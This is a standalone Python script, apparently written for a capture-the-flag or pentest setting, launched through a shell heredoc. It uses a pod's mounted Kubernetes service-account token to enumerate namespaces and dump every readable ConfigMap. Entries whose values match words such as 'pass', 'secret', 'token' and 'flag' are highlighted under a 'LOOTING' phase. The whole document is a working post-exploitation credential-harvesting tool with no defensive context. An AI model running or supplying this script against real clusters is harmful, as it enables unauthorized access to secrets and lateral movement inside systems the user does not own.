python3 - <<'EOF'
import os, sys, json, ssl, time
from urllib.request import Request, urlopen

# === CONFIGURATION ===
SA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH = os.path.join(SA_PATH, "token")
CACERT_PATH = os.path.join(SA_PATH, "ca.crt")
APISERVER = "https://kubernetes.default.svc"

# === STYLING ENGINE ===
class C:
    # Foreground
    W = "\033[97m"; G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"
    B = "\033[94m"; C = "\033[96m"; M = "\033[95m"; GR = "\033[90m"
    # Decorators
    BOLD = "\033[1m"; CLR = "\033[0m"

def banner():
    print(f"""{C.C}{C.BOLD}
   __ __ ___  _____   _____   ___ 
  / // /|_  ||___ /  | ____| / _ \\ 
 / // /_ _| |  |_ \\  |  _|  | | | |
/ __ \/ __| | ___) | | |___ | |_| |
\/  \/____/_||____/  |_____| \___/ 
                       v7.0 (Deep Read){C.CLR}
    """)
    time.sleep(1)

def header(title, icon="🔎"):
    print(f"\n{C.B}╔{'═'*60}╗{C.CLR}")
    print(f"{C.B}║ {icon} {title:<56} ║{C.CLR}")
    print(f"{C.B}╚{'═'*60}╝{C.CLR}")
    time.sleep(0.5)

def loot_box(key, value):
    val_len = len(value)
    width = max(val_len + 4, 40)
    if width > 60: width = 60
    
    print(f"\n   {C.R}╔{'═'*width}╗{C.CLR}")
    print(f"   {C.R}║ 🚨 CRITICAL KEYWORD MATCH ({key}){' '*(width-30-len(key))} ║{C.CLR}")
    print(f"   {C.R}╚{'═'*width}╝{C.CLR}")

def print_file_content(content, limit_lines=20):
    lines = content.split('\n')
    total_lines = len(lines)
    
    # Header line
    print(f"{C.GR}   ┌{'─'*50}{C.CLR}")
    
    for i, line in enumerate(lines[:limit_lines]):
        # Clean up line for display
        clean_line = line.replace('\t', '  ').rstrip()
        print(f"{C.GR}   │ {C.W}{clean_line}{C.CLR}")
    
    if total_lines > limit_lines:
        print(f"{C.GR}   │ {C.Y}... [truncated {total_lines - limit_lines} more lines] ...{C.CLR}")
    
    print(f"{C.GR}   └{'─'*50}{C.CLR}")
    time.sleep(0.2)

# === K8S API ===
if not os.path.exists(TOKEN_PATH):
    print(f"{C.R}❌ FATAL: No Service Account Token found.{C.CLR}"); sys.exit(1)

with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
with open(os.path.join(SA_PATH, "namespace")) as f: MY_NS = f.read().strip()
SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)

def k8s_api(path):
    req = Request(f"{APISERVER}{path}", headers={"Authorization": f"Bearer {TOKEN}"})
    try:
        with urlopen(req, context=SSL_CTX, timeout=3) as res:
            return json.loads(res.read())
    except: return None

# === MAIN RUNNER ===
banner()
print(f"{C.GR}   [+] Pod Context: {C.W}{MY_NS}{C.CLR}")

# --- 1. DISCOVERY ---
header("PHASE 1: TARGET ACQUISITION")
print(f"{C.GR}   [i] Querying API for available namespaces...{C.CLR}")

namespaces = []
resp = k8s_api("/api/v1/namespaces")

if resp and "items" in resp:
    namespaces = [i["metadata"]["name"] for i in resp["items"]]
    print(f"   {C.G}✔ API Access Granted.{C.CLR}")
    print(f"   {C.G}✔ Discovered {len(namespaces)} Namespaces.{C.CLR}")
else:
    print(f"   {C.R}✖ API Access Denied (Listing).{C.CLR}")
    namespaces = [MY_NS]

# --- 2. LOOTING ---
header("PHASE 2: DEEP SCAN", "🔓")

for ns in namespaces:
    # Visual Separator for Namespace
    print(f"{C.C}┌── 📂 NAMESPACE: {C.BOLD}{ns.upper()}{C.CLR}")
    
    cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
    
    if not cm_resp or "items" not in cm_resp:
        print(f"{C.C}└── {C.R}✖ Access Denied{C.CLR}\n")
        continue
    
    items = cm_resp['items']
    if not items:
        print(f"{C.C}└── {C.GR}(Empty){C.CLR}\n")
        continue

    # Process files
    last_idx = len(items) - 1
    for i, cm in enumerate(items):
        name = cm['metadata']['name']
        is_last = (i == last_idx)
        prefix = "└──" if is_last else "├──"
        
        # Skip noise
        if "kube-root" in name or "istio-ca" in name:
            print(f"{C.C}│   {prefix} {C.GR}{name} (Skipped){C.CLR}")
            continue

        print(f"{C.C}│   {prefix} {C.Y}📄 {name}{C.CLR}")
        
        if "data" in cm:
            for key, val in cm["data"].items():
                pipe = "    " if is_last else "│   "
                print(f"{C.C}│   {pipe}    👉 {C.C}{key}{C.CLR}")
                
                # Check keywords for Alert Box
                keywords = ["flag", "pass", "key", "secret", "user", "admin", "token"]
                if any(k in val.lower() or k in key.lower() for k in keywords):
                    loot_box(key, val)

                # ALWAYS print the first 20 lines neatly
                print_file_content(val, 20)
                
    print(f"{C.C}│{C.CLR}") 

header("SCAN COMPLETE", "🏁")
print(f"{C.G}   Enumeration finished.{C.CLR}\n")
EOF
